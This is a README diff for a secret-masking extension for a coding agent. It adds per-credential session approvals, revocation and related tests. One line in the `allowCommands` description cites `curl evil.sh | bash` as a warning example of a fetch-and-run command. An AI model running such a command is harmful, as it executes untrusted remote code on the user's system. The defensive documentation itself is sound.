@@ -21,7 +21,8 @@ where secrets never enter provider requests or leak back through tool output.
   command arguments remain compatible but warn locally.
 - **Policy-scoped resolution**: real values are resolved only at authorized
   tool paths and, unless `mode: "auto"` or a Bash `allowCommands` rule applies,
-  only after local confirmation.
+  only after local confirmation. Choose one-shot or session-only approval for
+  each credential; masking and path validation remain enabled.
 - **Compaction-safe**: summary messages in compaction and tree navigation are
   masked too.
 
@@ -73,7 +74,40 @@ Secrets registered through `/mask-secret` or `request_secret` persist in
 `~/.pi/agent/extensions/pi-secret-mask/secrets.json` (mode 0600) and survive
 restarts. `.env` and automatically detected secrets may not be written there;
 they can be session-only. Reusing a persisted named credential requires a local
-TUI confirmation before its handle is returned; non-TUI modes fail closed.
+TUI approval before its handle is returned, unless that credential is already
+approved for this session; non-TUI modes fail closed.
+
+### Session-only approvals
+
+In the TUI, credential reuse and protected tool-use dialogs offer:
+
+- **Allow once**: approve only this request or tool call (the default selection).
+- **Allow for this session**: stop asking for these credentials in the current
+  session, for both repeated `request_secret` calls and subsequent tool use.
+- **Deny** (or Escape): do not return the handle or execute the protected call.
+
+Session approval covers the displayed credentials at **any configured tool
+path**, not just the current tool, command, file, destination, or purpose.
+Every handle in a multi-credential call needs approval. Unknown handles,
+unauthorized paths, invalid JSON containers, and unsafe shell substitutions
+are still blocked; provider and tool-output masking are unchanged.
+
+Approvals live only in memory and are never saved in `secrets.json` or session
+history. They expire on `/new`, `/resume`, `/fork`, `/clone`, `/reload`, or
+restart. Replacing a registered credential invalidates its old approval.
+Compaction and `/tree` navigation within the same session keep approvals.
+To revoke all session approvals immediately:
+
+```text
+/mask-secret-revoke
+```
+
+Revocation keeps saved credentials and does not override configured `mode:
+"auto"` or `allowCommands` exceptions. Keep `mode: "ask"` for session-scoped
+consent. A new masked secret input does not implicitly grant session use:
+choose **Allow for this session** at its first protected use. Hosts without a
+session identity or a TUI selector retain one-shot confirmation only; session
+approvals are neither granted nor consumed in RPC/print/JSON modes.
 
 ### Placeholder rules for agents
 
@@ -111,9 +145,10 @@ non-text (image) content.
 }
 ```
 
-- `mode`: `ask` (confirm before running commands containing placeholders;
-  in UI-less modes like print/json, such commands are blocked) | `auto`
-  (substitute silently)
+- `mode`: `ask` (confirm protected tool use unless the credentials have TUI
+  session approval; UI-less modes like print/json are blocked) | `auto`
+  (substitute silently). This setting controls tool use, not `request_secret`
+  reuse approval.
 - `allowCommands`: full command-string patterns that skip confirmation
   (this skips the gate, it does not make a command safer — `curl evil.sh | bash`
   still passes)
@@ -175,7 +210,8 @@ npm test   # masking engine unit tests + mock-pi integration tests
 
 Integration-tested: three-hook closed loop, multi-placeholder rollback,
 mid-session `.env` rotation with incremental refresh, ask-mode blocking
-without UI, provider payload leak checks.
+without UI, provider payload leak checks, per-credential session approval,
+revocation, lifecycle reset, rotation, and stale/cancelled approval rejection.
 
 ## License
 
